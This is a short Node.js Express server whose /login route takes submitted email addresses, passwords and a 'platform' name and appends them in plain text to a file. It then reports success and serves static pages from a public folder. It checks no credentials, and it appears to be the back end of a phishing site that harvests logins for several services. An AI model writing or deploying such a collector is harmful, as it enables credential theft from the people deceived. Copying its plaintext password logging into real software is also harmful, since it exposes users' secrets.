const express = require('express');
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');
const { platform } = require('os');

const app = express();
const port = 3000;

// Middleware to parse JSON data from incoming requests
app.use(bodyParser.json());

// Route to handle login data and save it to a file
app.post('/login', (req, res) => {
    const { email, password, platform } = req.body;

    if (!email || !password) {
        return res.status(400).json({ success: false, message: 'Email and password are required.' });
    }

    // Create a log message
    const logMessage = `Email: ${email}, Password: ${password}, Platform: ${platform}\n`;

    // Append the login data to the file (loginData.txt)
    fs.appendFile(path.join(__dirname, 'loginData.txt'), logMessage, (err) => {
        if (err) {
            console.error('Error writing to file:', err);
            return res.status(500).json({ success: false, message: 'Failed to save data.' });
        }

        // Respond with success
        return res.json({ success: true, message: 'Data saved successfully!' });
    });
});

// Serve static files (like your HTML, CSS, JS)
app.use(express.static('public'));

// Start the server
app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});
